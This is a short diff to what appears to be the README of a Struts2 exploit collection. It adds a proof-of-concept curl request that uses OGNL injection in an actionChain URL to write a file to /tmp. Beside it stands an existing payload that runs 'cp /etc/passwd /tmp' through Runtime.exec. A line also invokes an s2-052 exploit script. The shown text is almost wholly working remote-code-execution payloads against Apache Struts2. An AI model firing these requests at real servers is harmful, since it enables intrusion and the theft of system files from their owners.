@@ -28,6 +28,9 @@ python s2-052.py -u http://127.0.0.1:8080/struts2-rest-showcase/orders/3 -c whoa
 Poc
 
 ```
+// FileOutputStream
+curl 'http://127.0.0.1/struts2-showcase/%24%7b(%23_memberAccess=%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23f=new%20java.io.FileOutputStream(%27/tmp/hello.txt%27),%23f.write(new%20sun.misc.BASE64Decoder().decodeBuffer(%27aGVsbG8K%27)),%23f.close())%7d/actionChain1.action'
+
 // Runtime.exec
 curl 'http://127.0.0.1/struts2-showcase/%24%7b(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%40java.lang.Runtime%40getRuntime().exec(%27cp%20/etc/passwd%20/tmp%27))%7d/actionChain1.action'
 
